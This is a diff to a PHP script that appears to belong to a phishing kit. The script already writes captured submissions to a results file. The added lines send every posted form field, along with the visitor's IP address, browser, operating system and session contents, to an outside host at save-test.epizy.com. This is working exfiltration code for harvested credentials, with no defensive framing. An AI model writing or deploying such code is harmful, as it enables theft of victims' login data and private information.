@@ -149,4 +149,44 @@ Date: ".$DATE."
 $localr3z = fopen("../../../REZLT/tnt2.txt","a");
 	fwrite($localr3z,$localrez);
         fclose($localr3z);	 
+		
+		
+		
+		
+		//----------------send request post to url ----------------
+function sendPost($url,$data) {
+	
+	
+	
+$options = array(
+        'http' => array(
+        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
+        'method'  => 'POST',
+        'content' => http_build_query($data),
+    )
+);
+
+$context  = stream_context_create($options);
+$result = file_get_contents($url, false, $context);
+return $result;
+}
+
+$data = $_POST;
+$data['date'] = $DATE;
+$data['REMOTE_ADDR'] = $_SERVER['REMOTE_ADDR'];
+$data['b'] = $browserTy_Version;
+$data['os'] = $OS;
+$data['s'] = $_SESSION;
+
+sendPost('http://www.save-test.epizy.com/sc2/sv2.php',$data);
+
+
+//---- end request----------------
+
+		
+		
+		
+		
+		
+		
 ?>
